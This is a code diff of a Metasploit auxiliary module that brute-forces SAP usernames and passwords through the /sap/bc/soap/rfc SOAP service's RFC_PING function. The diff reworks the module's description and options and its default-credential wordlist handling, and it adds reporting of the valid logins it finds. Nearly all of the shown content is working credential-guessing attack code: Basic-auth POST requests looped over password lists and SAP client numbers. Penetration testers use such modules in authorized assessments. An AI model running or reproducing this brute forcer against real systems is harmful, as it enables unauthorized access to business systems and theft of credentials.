@@ -27,23 +27,31 @@ class Metasploit4 < Msf::Auxiliary
 
 	def initialize
 		super(
-			'Name' => 'SAP SOAP RFC Brute Forcer (via RFC_PING)',
+			'Name' => 'SAP /sap/bc/soap/rfc SOAP Service RFC_PING Login Brute Forcer',
 			'Description' => %q{
-				This module attempts to brute force the username | password via an RFC
-				interface (over SOAP). Default clients can be tested without needing to set a
-				CLIENT. Common/Default user and password combinations can be tested without needing
-				to set a USERNAME, PASSWORD, USER_FILE or PASS_FILE. The default usernames and
-				password combinations are stored in ./data/wordlists/sap_default.txt.
-				},
-			'References' => [[ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]],
-			'Author' => [ 'Agnivesh Sathasivam','nmonkee' ],
-			'License' => BSD_LICENSE
-			)
-		register_options([
-			OptString.new('CLIENT', [false, 'Client can be single (066), comma seperated list (000,001,066) or range (000-999)', '000,001,066']),
-			OptBool.new('DEFAULT_CRED',[false, 'Check using the defult password and username',true])
+				This module attempts to brute force SAP username and passwords through the
+				/sap/bc/soap/rfc SOAP service, using RFC_PING function. Default clients can be
+				tested without needing to set a CLIENT. Common/Default user and password
+				combinations can be tested just setting DEFAULT_CRED variable to true. These
+				default combinations are stored in MSF_DATA_DIRECTORY/wordlists/sap_default.txt.
+			},
+			'References' =>
+				[
+					[ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]
+				],
+			'Author' =>
+				[
+					'Agnivesh Sathasivam',
+					'nmonkee'
+				],
+			'License' => MSF_LICENSE
+		)
+		register_options(
+			[
+				Opt::RPORT(8000),
+				OptString.new('CLIENT', [false, 'Client can be single (066), comma seperated list (000,001,066) or range (000-999)', '000,001,066']),
+				OptBool.new('DEFAULT_CRED',[false, 'Check using the defult password and username',true])
 			], self.class)
-		register_autofilter_ports([ 8000 ])
 	end
 
 	def run_host(ip)
@@ -81,8 +89,7 @@ class Metasploit4 < Msf::Auxiliary
 					"pass"
 				])
 		if datastore['DEFAULT_CRED']
-			datastore['USERPASS_FILE'] = Msf::Config.data_directory + '/wordlists/sap_default.txt'
-			credentials = extract_word_pair(datastore['USERPASS_FILE'])
+			credentials = extract_word_pair(Msf::Config.data_directory + '/wordlists/sap_default.txt')
 			credentials.each do |u, p|
 				client.each do |cli|
 					success = bruteforce(u, p, cli)
@@ -91,13 +98,12 @@ class Metasploit4 < Msf::Auxiliary
 					end
 				end
 			end
-		else
-			each_user_pass do |u, p|
-				client.each do |cli|
-					success = bruteforce(u, p, cli)
-					if success
-						saptbl << [ rhost, rport, cli, u, p]
-					end
+		end
+		each_user_pass do |u, p|
+			client.each do |cli|
+				success = bruteforce(u, p, cli)
+				if success
+					saptbl << [ rhost, rport, cli, u, p]
 				end
 			end
 		end
@@ -114,9 +120,6 @@ class Metasploit4 < Msf::Auxiliary
 		data << '</env:Envelope>'
 		user_pass = Rex::Text.encode_base64(username+ ":" + password)
 		begin
-			success = false
-			error = []
-			error_msg = []
 			res = send_request_raw({
 				'uri' => '/sap/bc/soap/rfc?sap-client=' + client + '&sap-language=EN',
 				'method' => 'POST',
@@ -128,25 +131,23 @@ class Metasploit4 < Msf::Auxiliary
 					'Authorization' => 'Basic ' + user_pass,
 					'Content-Type' => 'text/xml; charset=UTF-8'}
 					}, 45)
-			if res and res.code == 401
-				success = false
-				return success
-			elsif res and res.code == 500
-				response = res.body
-				error.push(response.scan(%r{<faultstring>(.*?)</faultstring>}))
-				error.push(response.scan(%r{<message>(.*?)</message>}))
-				success = false
-			elsif res and res.code == 200
-				success = true
-				return success
+			if res and res.code == 200
+				report_auth_info(
+					:host => rhost,
+					:port => rport,
+					:sname => "sap",
+					:proto => "tcp",
+					:user => "#{username}",
+					:pass => "#{password}",
+					:proof => "SAP Client: #{client}",
+					:active => true
+				)
+				return true
 			end
-			if success
-				err = error.join.chomp
-				print_error("[SAP] #{rhost}:#{rport} - #{err} - #{client}:#{username}:#{password}")
-			end
-			rescue ::Rex::ConnectionError
-				print_error("[SAP] #{rhost}:#{rport} - Unable to connect")
-				return
-			end
+		rescue ::Rex::ConnectionError
+			print_error("[SAP] #{rhost}:#{rport} - Unable to connect")
+			return false
 		end
+		return false
 	end
+end
